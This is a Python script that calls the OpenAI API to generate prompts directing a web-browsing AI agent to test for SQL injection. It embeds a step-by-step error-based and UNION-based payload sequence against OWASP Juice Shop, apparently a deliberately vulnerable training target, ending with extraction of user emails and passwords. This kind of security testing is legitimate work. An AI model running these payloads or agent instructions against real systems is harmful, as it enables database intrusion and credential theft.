from openai import OpenAI
client = OpenAI()

completion = client.chat.completions.create(
    model="gpt-4o",
    messages=[
        {
            "role": "user",
            "instructions": """"
            Create a prompt based on the provided threat for convergence-ai proxy which is an AI model with access to the web 
            and the ability to perform tasks to test for SQL vulnerabilities."
            
            Follow this template for your response:
            Test for SQL injection on `https://juice-shop.herokuapp.com/rest/products/search?q=` using error-based and UNION-based techniques.

            Start on the home page: https://juice-shop.herokuapp.com.

            1. **Confirm Vulnerability**  
            - Inject: `'` → Expect `SQLITE_ERROR`  
            - URL: `https://juice-shop.herokuapp.com/rest/products/search?q='`

            2. **Find Column Count**  
            - Inject: `')) ORDER BY X --` (increment X until error)  
            - Example: `https://juice-shop.herokuapp.com/rest/products/search?q=')) ORDER BY 9 --`

            3. **Extract Data Using UNION**  
            - Identify printable columns:  
                `https://juice-shop.herokuapp.com/rest/products/search?q=')) UNION SELECT 1,2,3,4,5,6,7,8,9 --`  

            4. **Dump Database Schema**  
            - List tables:  
                `https://juice-shop.herokuapp.com/rest/products/search?q=')) UNION SELECT 1,2,3,name,5,6,7,8,9 FROM sqlite_master WHERE type='table' --`  
            - Get table structure:  
                `https://juice-shop.herokuapp.com/rest/products/search?q=')) UNION SELECT 1,2,3,sql,5,6,7,8,9 FROM sqlite_master WHERE name='Users' --`

            5. **Extract User Table Data**  
            - Retrieve user credentials (adjust column names based on schema discovery):  
                `https://juice-shop.herokuapp.com/rest/products/search?q=')) UNION SELECT 1,2,3,email,password,6,7,8,9 FROM Users --`  

            Expected Results: If vulnerable, the database schema and data should be retrievable. If secure, errors should be suppressed.

            """,
            "content": ""
        }
    ]
)

print(completion.choices[0].message.content)